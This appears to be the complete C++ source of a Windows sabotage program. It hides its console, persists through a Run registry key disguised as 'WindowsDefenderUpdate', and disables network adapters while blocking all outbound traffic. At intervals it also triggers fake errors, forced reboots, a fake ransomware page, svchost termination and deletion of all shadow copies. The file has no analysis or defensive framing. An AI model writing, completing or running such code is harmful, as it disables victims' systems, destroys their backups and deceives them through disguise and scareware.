#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <shlobj.h>
#include <regex>
#pragma comment(lib, "wininet.lib")

#define TARGET_INTERVAL 180000 

void AddToStartup() {
    HKEY hKey;
    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)szPath, (DWORD)strlen(szPath));
        RegCloseKey(hKey);
    }
}

void DisableInternet() {
    system("netsh interface set interface \"Wi-Fi\" admin=disable");
    system("netsh interface set interface \"Ethernet\" admin=disable");
    system("netsh advfirewall set allprofiles state on");
    system("netsh advfirewall firewall add rule name=\"BlockAll\" dir=out action=block protocol=ANY");
}

void TriggerFakeError() {
    srand((unsigned int)time(NULL));
    int errorType = rand() % 5;

    switch (errorType) {
    case 0:
        MessageBoxA(NULL, "CRITICAL NETWORK STACK FAILURE (0x800F0922)", "SYSTEM ALERT", MB_ICONERROR);
        break;
    case 1:
        system("shutdown /r /t 10 /c \"DNS resolver corrupted. Rebooting...\"");
        break;
    case 2:
        system("echo ^<html^>^<body bgcolor=black^>^<h1 style=\"color:red\"^>YOUR FILES ARE BEING ENCRYPTED^</h1^>^</body^>^</html^> > C:\\temp\\fake_ransom.html && start C:\\temp\\fake_ransom.html");
        break;
    case 3:
        system("wmic process where name=\"svchost.exe\" delete");
        break;
    case 4:
        system("vssadmin delete shadows /all /quiet");
        break;
    }
}

void StealthMode() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    StealthMode();
    AddToStartup();
    DisableInternet();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        TriggerFakeError();
        Sleep(TARGET_INTERVAL);
    }

    return 0;
}
